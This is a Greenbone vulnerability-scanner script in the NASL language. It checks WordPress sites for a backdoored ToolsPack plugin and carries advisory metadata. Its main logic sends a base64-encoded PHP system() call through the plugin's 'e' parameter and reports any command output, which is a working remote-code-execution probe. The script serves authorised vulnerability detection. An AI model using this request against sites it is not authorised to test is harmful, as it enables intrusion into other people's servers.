# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103445");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Backdoored WordPress ToolsPack Plugin");

  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-03-08 10:26:15 +0100 (Thu, 08 Mar 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_wordpress_http_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_tag(name:"summary", value:"The WordPress ToolsPack Plugin on this host contains a Backdoor.");
  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary code within the
context of the affected webserver process.");
  script_tag(name:"solution", value:"Remove the plugin and do a full review of the website - check all your files,
update WordPress, change passwords, etc.");

  script_tag(name:"solution_type", value:"Workaround");

  script_xref(name:"URL", value:"http://blog.sucuri.net/2012/02/new-wordpress-toolspack-plugin.html");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

commands = exploit_commands();

foreach cmd (keys(commands)) {

  ex = "system('" + commands[cmd]  + "');";
  ex = base64(str:ex);
  url = string(dir, "/wp-content/plugins/ToolsPack/ToolsPack.php?e=",ex);

  if(buf = http_vuln_check(port:port, url:url, pattern:cmd)) {
    report = 'It was possible to execute the command "' + commands[cmd]  + '" which produces the following output:\n\n' + buf;
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(0);
